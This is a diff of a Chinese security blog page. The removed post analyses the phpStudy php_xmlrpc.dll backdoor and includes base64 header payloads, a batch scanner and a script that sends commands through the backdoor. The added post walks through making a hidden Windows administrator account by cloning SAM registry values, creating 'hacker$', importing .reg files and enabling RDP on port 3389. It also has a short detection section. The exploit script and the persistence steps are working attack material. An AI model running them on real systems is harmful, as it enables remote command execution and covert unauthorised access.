@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>phpstudy后门分析 · H0e4a0r1t&#39;s Blog</title>
+    <title>Windows系统的帐户隐藏 · H0e4a0r1t&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">H0e4a0r1t&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">phpstudy后门分析</a>
+                <a href="#" class="post-name">Windows系统的帐户隐藏</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            phpstudy后门分析
+            Windows系统的帐户隐藏
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">797</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">991</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/09/30</span>
+                    <span class="post-intro-time">2019/10/15</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,40 +395,76 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>最近phpstudy后门一经爆出，震惊了安全圈，不知不觉的当了三年肉鸡-。-、</p>
-<p>都爆出好久了，我也跟风一波，分析一下，搞篇文章了，观摩众多大佬，划水一波算了：）</p>
-<h3 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01. 影响版本"></a>0x01. 影响版本</h3><ul>
-<li>phpStudy2016<br><code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>php\php-5.4.45\ext\php_xmlrpc.dll</code></li>
-<li>phpStudy2018<br><code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></li>
+        <h1 id="Windows系统的帐户隐藏"><a href="#Windows系统的帐户隐藏" class="headerlink" title="Windows系统的帐户隐藏"></a>Windows系统的帐户隐藏</h1><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h3><p>之前学习过通过帐户克隆实现隐藏帐户的利用技巧，只是每次使用隐藏账户登录时会挤掉正在登陆的用户，下一期我会详细解决掉这个问题，这期先做个笔记，水一篇 :)</p>
+<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01. 简介"></a>0x01. 简介</h3><p>主介绍以下内容：</p>
+<ul>
+<li>帐户隐藏的方法</li>
+<li>编写脚本实现思路</li>
+<li>结合远程桌面多用户登录的利用思路</li>
 </ul>
-<h3 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02. 漏洞发现"></a>0x02. 漏洞发现</h3><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</span><br></pre></td></tr></table></figure>
-<p>存在<code>@eval(%s(&#39;%s&#39;));</code>即说明有后门。</p>
-<p><img src="https://i.loli.net/2019/09/30/XSOfq7MBtlN8Dds.png" alt></p>
-<h3 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03. 复现"></a>0x03. 复现</h3><p>复现环境：win7+phpStudy 2018(php-5.4.45+Apache)</p>
-<p><img src="https://i.loli.net/2019/09/30/bClN6ufzgmajTV9.png" alt="1.png"></p>
-<p>访问首页，抓包</p>
-<p><img src="https://i.loli.net/2019/09/30/MiEHkz4D9dlrfOC.png" alt="3.png"></p>
-<p>在请求头里构造 <code>Accept-Encoding</code> 和 <code>accept-charset</code> 即可。</p>
-<p>accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==       system(‘net user’);</p>
-<p>accept-charset: c3lzdGVtKCdpcGNvbmZpZycpIDs=      system(‘ipconfig’);</p>
-<p>accept-charset: c3lzdGVtKCd3aG9hbWknKSA7              system(‘whoami’);</p>
-<p><img src="https://i.loli.net/2019/09/30/8aQFKWdvCof26gD.png" alt="4.png"></p>
-<p><code>Accept-Encoding</code> 已经有了，但是这里注意：<br><strong>要把gzip, deflate 里逗号后面的空格去掉，不然命令执行不成功。</strong></p>
-<p><img src="https://i.loli.net/2019/09/30/HnqlzytRxsu2Zrm.png" alt="6.png"></p>
-<p>base64 转义建议小葵工具包</p>
-<h2 id="后门检测脚本"><a href="#后门检测脚本" class="headerlink" title="后门检测脚本"></a>后门检测脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import gevent</span><br><span class="line">from gevent import monkey</span><br><span class="line"></span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line">import requests as rq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def file_read(file_name=&quot;url.txt&quot;):</span><br><span class="line">    with open(file_name, &quot;r&quot;) as f:</span><br><span class="line">        return [i.replace(&quot;\n&quot;, &quot;&quot;) for i in f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(url):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    if &quot;http://&quot; or &quot;https://&quot; not in url:</span><br><span class="line">        url = &quot;https://&quot; + url</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Mode&apos;: &apos;navigate&apos;,</span><br><span class="line">        &apos;Sec-Fetch-User&apos;: &apos;?1&apos;,</span><br><span class="line">        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Site&apos;: &apos;none&apos;,</span><br><span class="line">        &apos;accept-charset&apos;: &apos;ZWNobyBlZVN6eHU5Mm5JREFiOw==&apos;,  # 输出 eeSzxu92nIDAb</span><br><span class="line">        &apos;Accept-Encoding&apos;: &apos;gzip,deflate&apos;,</span><br><span class="line">        &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        res = rq.get(url, headers=headers, timeout=20)</span><br><span class="line">        if res.status_code == 200:</span><br><span class="line">            if res.text.find(&apos;eeSzxu92nIDAb&apos;):</span><br><span class="line">                print(&quot;[存在漏洞] &quot; + url)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;[超时] &quot; + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(&quot;phpStudy 批量检测 (需要 gevent,requests 库)&quot;)</span><br><span class="line">    print(&quot;使用之前，请将URL保存为 url.txt 放置此程序同目录下&quot;)</span><br><span class="line">    input(&quot;任意按键开始执行..&quot;)</span><br><span class="line">    tasks = [gevent.spawn(check, url) for url in file_read()]</span><br><span class="line">    print(&quot;正在执行...请等候&quot;)</span><br><span class="line">    gevent.joinall(tasks)</span><br><span class="line">    wait = input(&quot;执行完毕 任意键退出...&quot;)</span><br></pre></td></tr></table></figure>
-<h2 id="后门执行脚本"><a href="#后门执行脚本" class="headerlink" title="后门执行脚本"></a>后门执行脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def backdoor(url, command=&quot;system(&apos;calc.exe&apos;);&quot;):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Mode&apos;: &apos;navigate&apos;,</span><br><span class="line">        &apos;Sec-Fetch-User&apos;: &apos;?1&apos;,</span><br><span class="line">        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;,</span><br><span class="line">        &apos;Sec-Fetch-Site&apos;: &apos;none&apos;,</span><br><span class="line">        &apos;accept-charset&apos;: &apos;c3lzdGVtKCdjYWxjLmV4ZScpOw==&apos;,</span><br><span class="line">        &apos;Accept-Encoding&apos;: &apos;gzip,deflate&apos;,</span><br><span class="line">        &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.9&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    command = base64.b64encode(command.encode(&apos;utf-8&apos;))</span><br><span class="line">    command = str(command, &apos;utf-8&apos;)</span><br><span class="line">    result = requests.get(url, headers=headers, verify=False)</span><br><span class="line">    if result.status_code == &quot;200&quot;:</span><br><span class="line">        print(&quot;执行完成&quot;)</span><br><span class="line">    a = input(&quot;任意键退出...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;输入URL(例如:http://127.0.0.1:228/xx.php)\n&quot;)</span><br><span class="line">command = input(&quot;输入命令 默认为 system(&apos;calc.exe&apos;); (不想输入直接回车)\n&quot;)</span><br><span class="line">backdoor(url, command)</span><br></pre></td></tr></table></figure>
-<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://www.cnblogs.com/liliyuanshangcao/p/11584397.html" target="_blank" rel="noopener">https://www.cnblogs.com/liliyuanshangcao/p/11584397.html</a></p>
-
+<h3 id="0x02-账户隐藏的方法"><a href="#0x02-账户隐藏的方法" class="headerlink" title="0x02. 账户隐藏的方法"></a>0x02. 账户隐藏的方法</h3><p>测试系统：Win7_64位</p>
+<h4 id="1-对注册表赋予权限（regedit）"><a href="#1-对注册表赋予权限（regedit）" class="headerlink" title="1. 对注册表赋予权限（regedit）"></a>1. 对注册表赋予权限（regedit）</h4><p>默认注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有system权限才能修改</p>
+<p>现在需要为其添加管理员权限</p>
+<p>右键-权限-选中Administrators，允许完全控制</p>
+<p>如下图</p>
+<p><img src="https://i.loli.net/2019/10/11/UuZW6M2e8bCIpgL.png" alt="1.png"></p>
+<p>重新启动注册表regedit.exe，获得对该键值的修改权限</p>
+<h4 id="2-新建特殊账户"><a href="#2-新建特殊账户" class="headerlink" title="2. 新建特殊账户"></a>2. 新建特殊账户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user kacker$ 123456 /add</span><br><span class="line">net localgroup administrators hacker$ /add</span><br></pre></td></tr></table></figure>
+<p>结尾使用$符号来对账户进行隐藏，即在net user命令下无法查看到该用户</p>
+<p><img src="https://i.loli.net/2019/10/11/51vQDzOEeqXFbMV.png" alt="2.png"></p>
+<p>但是，在控制面板能够发现该帐户</p>
+<p><img src="https://i.loli.net/2019/10/11/fqpSXHrBdKzu4GT.png" alt="3.png"></p>
+<h4 id="3-导出注册表"><a href="#3-导出注册表" class="headerlink" title="3. 导出注册表"></a>3. 导出注册表</h4><p>在注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户hacker$</p>
+<p>获取默认类型为<code>0x3e9</code></p>
+<p>将注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\hacker$</code>导出为<code>1.reg</code></p>
+<p>在注册表下能够找到对应类型名称的注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</code></p>
+<p><img src="https://i.loli.net/2019/10/11/ONCydmKuLZTqi8l.png" alt="4.png"></p>
+<p>右键将该键导出为<code>2.reg</code></p>
+<p><img src="https://i.loli.net/2019/10/11/dCHXUmpRLG1jEB3.png" alt="5.png"></p>
+<p>默认情况下，管理员帐户Administrator对应的注册表键值为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code></p>
+<p>同样，右键将该键导出为<code>3.reg</code></p>
+<p>将注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</code>下键F的值替换为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键F的值，即2.reg中键F的值替换成3.reg中键F的值</p>
+<p><img src="https://i.loli.net/2019/10/11/PfWr4DVbBKTUnA1.png" alt="6.png"></p>
+<h4 id="4-命令行删除特殊用户"><a href="#4-命令行删除特殊用户" class="headerlink" title="4. 命令行删除特殊用户"></a>4. 命令行删除特殊用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker$ /del</span><br></pre></td></tr></table></figure>
+<h4 id="5-导入reg文件"><a href="#5-导入reg文件" class="headerlink" title="5. 导入reg文件"></a>5. 导入reg文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit /s 1.reg</span><br><span class="line">regedit /s 2.reg</span><br></pre></td></tr></table></figure>
+<p>隐藏账户制做完成，控制面板不存在帐户test$</p>
+<p>通过net user无法列出该帐户</p>
+<p>计算机管理-本地用户和组-用户也无法列出该帐户</p>
+<p>但可通过如下方式查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker$</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/11/NOPHvTljsxmSL1X.png" alt="7.png"></p>
+<p>无法通过<code>net user test$ /del</code>删除该用户，提示用户不属于此组</p>
+<p><img src="https://i.loli.net/2019/10/11/jkSvPowduNGtV7z.png" alt="8.png"></p>
+<p><strong>删除方法：</strong></p>
+<p>删除注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值(共有两处)</p>
+<p><strong>注：</strong></p>
+<p>工具HideAdmin能自动实现以上的创建和删除操作</p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03. 总结"></a>0x03. 总结</h3><p>该方法的优点：<strong>通过克隆的方式能够继承原帐户的权限</strong></p>
+<p>在利用上存在以下需要注意的问题：</p>
+<h4 id="1、复制管理员帐户Administrator"><a href="#1、复制管理员帐户Administrator" class="headerlink" title="1、复制管理员帐户Administrator"></a>1、复制管理员帐户Administrator</h4><p>需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态</p>
+<h4 id="2、复制已有帐户"><a href="#2、复制已有帐户" class="headerlink" title="2、复制已有帐户"></a>2、复制已有帐户</h4><p>在3389远程登录的利用上存在相同帐户的冲突关系</p>
+<p>通过cmd开启本机的3389远程登录功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure>
+<p>利用以上方法，克隆帐户a的权限，建立隐藏帐户aaa$</p>
+<p>如果系统当前登录帐号为a，那么使用隐藏帐户aaa$登录的话，会系统被识别为帐户a，导致帐户a下线</p>
+<h4 id="3、新建帐户再复制"><a href="#3、新建帐户再复制" class="headerlink" title="3、新建帐户再复制"></a>3、新建帐户再复制</h4><p>进一步，大胆的思考</p>
+<p>新建管理员帐户b，克隆帐户b，建立隐藏账户bbb$</p>
+<p>删除管理员帐户b，隐藏账户bbb$仍然有效</p>
+<h4 id="4、原帐户的维持"><a href="#4、原帐户的维持" class="headerlink" title="4、原帐户的维持"></a>4、原帐户的维持</h4><p>再进一步</p>
+<p>克隆帐户a的权限，建立隐藏帐户aaa$</p>
+<p>修改帐户a的密码，隐藏帐户aaa$仍然有效</p>
+<h3 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04. 防御"></a>0x04. 防御</h3><p>针对隐藏帐户的利用，查看注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>即可</p>
+<p>当然，默认管理员权限无法查看，需要分配权限或是提升至Sytem权限</p>
+<p>隐藏帐户的登录记录，可通过查看日志获取</p>
+<h2 id="To-be-continued…"><a href="#To-be-continued…" class="headerlink" title="To be continued…."></a>To be continued….</h2>
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/09/30/phpstudy后门/">http://yoursite.com/2019/09/30/phpstudy后门/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/09/30/phpstudy后门/">September 30th 2019, 10:16:28 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/09/30/phpstudy后门/">September 30th 2019, 11:59:17 pm</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/10/15/Windows系统的帐户隐藏/">http://yoursite.com/2019/10/15/Windows系统的帐户隐藏/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/10/15/Windows系统的帐户隐藏/">October 15th 2019, 10:51:21 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/10/15/Windows系统的帐户隐藏/">October 15th 2019, 10:51:12 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -437,16 +473,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2019/10/01/Windows日志的删除与绕过/" title="Windows日志的删除与绕过">
-                    <div class="nextTitle">Windows日志的删除与绕过</div>
+                <a href="/2019/10/15/Windows系统远程桌面的多用户登录/" title="Windows系统远程桌面的多用户登录">
+                    <div class="nextTitle">Windows系统远程桌面的多用户登录</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/09/30/新的开始/" title="新的开始">
-                    <div class="prevTitle">新的开始</div>
+                <a href="/2019/10/15/CVE-2019-14287 sudo 配置不当-权限提升漏洞/" title="CVE-2019-14287 sudo 配置不当-权限提升漏洞">
+                    <div class="prevTitle">CVE-2019-14287 sudo 配置不当-权限提升漏洞</div>
                 </a>
             
         </li>
@@ -565,7 +601,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-影响版本"><span class="toc-number">1.</span> <span class="toc-text">0x01. 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞发现"><span class="toc-number">2.</span> <span class="toc-text">0x02. 漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-复现"><span class="toc-number">3.</span> <span class="toc-text">0x03. 复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门检测脚本"><span class="toc-number"></span> <span class="toc-text">后门检测脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门执行脚本"><span class="toc-number"></span> <span class="toc-text">后门执行脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考："><span class="toc-number">1.</span> <span class="toc-text">参考：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows系统的帐户隐藏"><span class="toc-number">1.</span> <span class="toc-text">Windows系统的帐户隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x00.前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-简介"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x01. 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-账户隐藏的方法"><span class="toc-number">1.0.3.</span> <span class="toc-text">0x02. 账户隐藏的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-对注册表赋予权限（regedit）"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">1. 对注册表赋予权限（regedit）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-新建特殊账户"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">2. 新建特殊账户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-导出注册表"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">3. 导出注册表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-命令行删除特殊用户"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">4. 命令行删除特殊用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-导入reg文件"><span class="toc-number">1.0.3.5.</span> <span class="toc-text">5. 导入reg文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">1.0.4.</span> <span class="toc-text">0x03. 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、复制管理员帐户Administrator"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">1、复制管理员帐户Administrator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、复制已有帐户"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">2、复制已有帐户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、新建帐户再复制"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">3、新建帐户再复制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、原帐户的维持"><span class="toc-number">1.0.4.4.</span> <span class="toc-text">4、原帐户的维持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-防御"><span class="toc-number">1.0.5.</span> <span class="toc-text">0x04. 防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-be-continued…"><span class="toc-number">1.1.</span> <span class="toc-text">To be continued….</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
